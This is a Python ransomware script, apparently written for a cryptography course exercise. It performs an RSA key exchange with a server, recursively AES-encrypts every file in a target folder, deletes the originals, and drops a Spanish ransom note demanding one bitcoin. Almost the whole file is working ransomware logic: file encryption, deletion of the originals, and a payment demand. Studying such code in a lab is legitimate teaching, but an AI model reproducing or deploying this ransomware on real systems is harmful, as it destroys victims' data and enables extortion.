import glob
import os
import socket
from urllib import response
import json

from AES_File_Encryption import encrypt, getKey, decrypt
from RSA import RSA

# Conexion con el servidor
mi_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mi_socket.connect(('localhost', 8000))

# Generar clave publica y privada
rsaRansomWare = RSA()
e = 65537
l = 2048

print("Generando pk...")
sk, pk = rsaRansomWare.Grsa(l, e)

print("Enviando pk...")
mi_socket.send((json.dumps(pk)).encode("utf-8"))

print("Esperando y...")
while True:
    y = mi_socket.recv(2048).decode("utf-8")
    if y:
        break

print("Obteniendo x...")
x = rsaRansomWare.Irsa(sk, int(y))

mi_socket.close()
# Fin conexion con el servidor


# A continuación se encriptan todos los archivos usando la clave x

# Se define la carpeta PC como la carpeta donde se encuentran los archivos del sistema 👀
BASE_DIR = "/home/jwalvarez/Documents/taller_2_criptografia/PC"
dir_path = f'{BASE_DIR}/**/*.*'

files = []

for file in glob.glob(dir_path, recursive=True):
    files.append(file)

password = str(x)
key = getKey(password)

# Se encritan todos los archivos encontrados y se eliminan los originales
for file in files:
    encrypt(key, file)
    os.remove(file)

print('Archivos encriptados con exito 😈')

# Generación de lista de archivos encriptados
with open(f'{BASE_DIR}/.archivos_encriptados', 'w') as f:
    for file in files:
        f.write(f'{file}\n')


# Generación de archivo INSTRUCCIONES.txt
with open(f'{BASE_DIR}/INSTRUCCIONES.txt', 'w') as f:
    f.write('Los siguientes archivos han sido cifrados:\n\n')
    for file in files:
        # f.write(f'{file.split("/")[-1]}\n')
        f.write(f'{file}\n')
    f.write('\nPara descifrar los archivos, debe pagar 1 BTC a la siguiente dirección: LPCN3ASP931317726KKKJJJ291ASJDU\n')
    f.write('Una vez realizado el pago, envíe un correo a la siguiente dirección: correo@dominio.com\n')
